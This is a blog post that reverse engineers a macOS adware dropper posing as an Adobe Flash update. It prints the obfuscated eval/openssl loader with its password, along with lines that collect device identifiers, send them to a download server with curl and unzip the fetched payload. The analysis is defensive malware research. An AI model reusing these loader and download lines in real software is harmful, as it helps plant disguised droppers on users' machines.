+++ 
draft = false
date = 2018-10-16T16:51:10+02:00
title = "Reverse Engineering macOS fake Adobe Flash Update"
tags = ["Reverse Engineering", "Adware", "InfoSec"]
categories = ["Blog"]
+++

## A friend goof!

The incident started with an inattentive friend who just downloaded and installed a fake Adobe Flash Update for his Macbook.
The culprit ? While browsing [izap4u.com](http://izap4u.com/) (a french website who offers compilations of funny videos), the website showed a malicious pop-up message for an update of Adobe Flash Player.
It's not the case anymore. I do hope it's over.

## Clean up the mess

He reached to me for help and I quickly advised him to install [Malwarebytes for Mac](https://www.malwarebytes.com/mac/).
This software let you easily scan and removes malware and works great on MacOS.
He installed it and launched a threat scan; obviously the scan found the malware and helped my friend erase it.

## Curiosity

I was curious about this Adware so I downloaded it too, in order to reverse it!
At first glance it's small in size [.dmg](https://en.wikipedia.org/wiki/Apple_Disk_Image) (~108KB only).
It contains a "Player_XXX.app" which is represented by the classic Flash Player icon.

Here is the package structure:
```
/Volumes/Player
❯ tree Player_061.app
Player_061.app
└── Contents
    ├── Info.plist
    ├── MacOS
    │   └── hikx4NR1tZPZLkfhszbSF2SglR1V8iKE3Q
    ├── Resources
    │   ├── app4862950061.icns
    │   └── enc
    └── _CodeSignature
        ├── CodeDirectory
        ├── CodeRequirements
        ├── CodeRequirements-1
        ├── CodeResources
        └── CodeSignature

4 directories, 9 files
```

## Dig in

### First Analysis

Here we will look at two files `enc` and `hikx4NR1tZPZPZLkfhszbSF2SglR1V8iKE3Q`:
```
❯ file Player_061.app/Contents/MacOS/hikx4NR1tZPZLkfhszbSF2SglR1V8iKE3Q
Player_061.app/Contents/MacOS/hikx4NR1tZPZLkfhszbSF2SglR1V8iKE3Q: Bourne-Again shell script text executable, ASCII text
```
```
❯ cat Player_061.app/Contents/MacOS/hikx4NR1tZPZLkfhszbSF2SglR1V8iKE3Q
#!/bin/bash
cd "$(dirname "$BASH_SOURCE")"
fileDir="$(dirname "$(pwd -P)")"
eval "$(openssl enc -base64 -d -aes-256-cbc -nosalt -pass pass:4862950061 <"$fileDir"/Resources/enc)"
```
```
❯ file Player_061.app/Contents/Resources/enc
Player_061.app/Contents/Resources/enc: ASCII text
```
*You can find base64 encrypted content here:* [`enc`](https://gist.github.com/oxynux/0221cfe7920f0a8d22ec75f5f63c3f25).


Here, we have a bash script and a base64 encoded text file.

### Decrypt `enc`

`hikx4NR1tZPZLkfhszbSF2SglR1V8iKE3Q` BASH script help us to decrypt `enc` file with this command:
```
openssl enc -base64 -d -aes-256-cbc -nosalt -pass pass:4862950061 </tmp/Player/Player_061.app/Contents/Resources/enc
```
*You can see the result here (spoiler it's a bash script too!):* [`decrypted_enc.sh`](https://gist.github.com/oxynux/460e01bf0045524af8a3bced006cf1ad/7a24e26c3b851dfda4af549bd4c0f6018c2a6360).


### What does this script do?

This bash script strongly rely on the `eval` command.
But what does `eval` do ?
If you type `help eval` inside a Terminal on MacOS you will get:
```
eval: eval [arg ...]
    Read ARGs as input to the shell and execute the resulting command(s).
```
Pretty easy, right ?

Eval basically concatenates all arguments and executes the result as a command.
We don't want to install this Adware so we are going to replace the last `eval` by `echo` which only print out the script instead of running it: [`decrypted_enc.sh`](https://gist.github.com/oxynux/460e01bf0045524af8a3bced006cf1ad/90ccb26323a6abfd5f19dcce425cada627e76df5).

`chmod +x decrypted_enc.sh` and then execute it.

We obtain this (spoiler it's again a bash script! Script-ception never end): [`final_decrypted_enc.sh`](https://gist.github.com/oxynux/98636477186b97834f8300ac80e6df8b/1b73f0d053a68fe12d2bca7b5b8cdc7f1102fdad).

### Prepare the script

This script has a lot of variables, but they are not prefixed by `export ` because it's useless inside an `eval`.
So we have to slightly modify it to make it work outside an `eval`:

- We add `export` before every variable, and remove `>/dev/null 2>&1` whom silence `stderr` and `stdout`, we also add `-v` to the `curl` command for debugging purposes.

- We also want to catch all variables values of this script, so we add a `echo interesting_var=$interesting_var` for all of these. 

- Finally, we want to print script lines as they are read to follow along while it's running. `set -v` allows us to do this.

- One last thing: we definitely don't want to install the Adware so we comment the last two lines -which open the malicious file and make it executable- with `#`.

Here is the final script ready to launch: [`final_decrypted_enc.sh`](https://gist.github.com/oxynux/98636477186b97834f8300ac80e6df8b/2efc9a09b588900a9a2732e7fc89dd717776f409).

### (What does this script do?)²

After this we can launch the script to better understand how it works.

Here's the interesting outputs:

_MacOS version_
```
sw_vers -productVersion
os_version=10.14.1
```

_An Universally Unique IDentifier (UUID)_
```
uuidgen
session_guid=05D6295D-5A6E-43EE-BA60-D602682FAA43
```  

_The unique equipment identifier IOPlatformUUID (I have anonymized mine)_
```
echo -n "$(ioreg -rd1 -c IOPlatformExpertDevice | grep -o '"IOPlatformUUID" = "\(.*\)"' | sed -E -n 's@.*"([^"]+)"@\1@p')" | tr -dc '[[:print:]]'
machine_id=XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
```  

_The url to download the malware: it uses `$os_version`, `$session_guid` and `$machine_id`_
```
url="http://api.binarysources.com/sd/?c=_pl_GJybQ==&u=$machine_id&s=$session_guid&o=$os_version&b=4862950061"
curl -v -f0L "$url" >>$tmp_path
```  

_The .zip dowload via `$url` seems to alway have the same password_
```
unzip_password="16005926849404862950061"
unzip -P "$unzip_password" "$tmp_path" -d "$app_dir"
```  


This script uses `curl` to download the malware, share the macOS version, UUID and the IOPlatformUUID of the victim to the server with [query string](https://en.wikipedia.org/wiki/Query_string).
I think the malware is generated thanks to this, it aims to be unique so it can dupe [Apple Gatekeeper](https://en.wikipedia.org/wiki/Gatekeeper_(macOS)).

### Side note

When I attempted to download the malware the url didn't work anymore so I couldn't continue the reverse engineering.
```
curl -v -f0L "$url" >>$tmp_path
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 88.221.14.24...
* TCP_NODELAY set
* Connected to api.binarysources.com (88.221.14.24) port 80 (#0)
> GET /sd/?c=_pl_GJybQ==&u=XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX&s=05D6295D-5A6E-43EE-BA60-D602682FAA43&o=10.14.1&b=4862950061 HTTP/1.0
> Host: api.binarysources.com
> User-Agent: curl/7.62.0
> Accept: */*
>
* The requested URL returned error: 404 Not Found
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
* Closing connection 0
curl: (22) The requested URL returned error: 404 Not Found
```

## Conclusion

Be vigilant when you surf the internet and don't type your password when your are not sure about installer safety.
